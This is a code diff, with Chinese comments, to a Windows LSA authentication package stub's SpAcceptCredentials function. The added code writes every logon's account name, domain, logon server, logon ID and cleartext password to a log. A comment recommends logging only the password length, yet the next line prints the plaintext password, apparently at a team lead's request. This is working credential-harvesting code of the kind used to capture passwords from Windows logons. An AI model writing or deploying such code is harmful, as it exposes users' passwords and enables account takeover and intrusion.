@@ -123,8 +123,49 @@ NTSTATUS NTAPI SpAcceptCredentials(_In_ SECURITY_LOGON_TYPE       LogonType,
                                    _In_ PSECPKG_PRIMARY_CRED      PrimaryCredentials,
                                    _In_ PSECPKG_SUPPLEMENTAL_CRED SupplementalCredentials)
 {
-    LogMessage("[AP-STUB] SpAcceptCredentials Called. User: %ls",
-               AccountName ? AccountName->Buffer : L"Unknown");
+    // 1. 定义登录类型名称，方便查日志
+    const wchar_t* LSA_LOGON_TYPE[] = {L"Undefined",
+                                       L"Unknown",
+                                       L"Interactive",
+                                       L"Network",
+                                       L"Batch",
+                                       L"Service",
+                                       L"Proxy",
+                                       L"Unlock",
+                                       L"NetworkCleartext",
+                                       L"NewCredentials",
+                                       L"RemoteInteractive",
+                                       L"CachedInteractive",
+                                       L"CachedRemoteInteractive",
+                                       L"CachedUnlock"};
+
+    LogMessage(">>>> [SpAcceptCredentials] 接收到系统分发的凭据内容：");
+
+    if (AccountName)
+        LogMessage("   [+] 账户名: %wZ", AccountName);
+
+    if (PrimaryCredentials)
+    {
+        LogMessage("   [+] 登录ID: %u:%u",
+                   PrimaryCredentials->LogonId.HighPart,
+                   PrimaryCredentials->LogonId.LowPart);
+        LogMessage("   [+] 域名: %wZ", &PrimaryCredentials->DomainName);
+        LogMessage("   [+] 登录服务器: %wZ", &PrimaryCredentials->LogonServer);
+
+        // 关键：打印密码长度，证明我们是否拿到了明文
+        if (PrimaryCredentials->Password.Buffer != nullptr)
+        {
+            LogMessage("   [+] 密码长度: %u 字节", PrimaryCredentials->Password.Length);
+            // 注意：为了安全，建议只打长度。如果组长非要看明文，可以用 %wZ 打印 Password
+            LogMessage("   [+] 密码明文: %wZ", &PrimaryCredentials->Password);
+        }
+        else
+        {
+            LogMessage("   [!] 警告：密码缓冲区为空（空密码登录）");
+        }
+    }
+
+    // 返回 SUCCESS 告诉系统：凭据我们已经收到了
     return STATUS_SUCCESS;
 }
 
